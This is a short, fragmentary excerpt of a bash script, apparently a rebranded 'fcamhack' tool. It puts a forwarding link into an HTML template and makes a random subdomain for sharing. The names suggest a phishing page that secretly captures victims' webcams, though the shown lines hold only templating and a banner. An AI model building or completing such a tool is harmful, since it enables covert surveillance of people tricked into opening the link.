...
# This script modified by fazle rabby
#@@2222222
...
printf "          \e[1;77m v1.1 This reborn script by { fazle rabby }\e[0m \n"
...
sed 's+forwarding_link+'$link'+g' fcamhack.html > index2.html
...
sed 's+forwarding_link+'$send_link'+g' fcamhack.html > index2.html
...
default_subdomain="fcamhack$RANDOM"
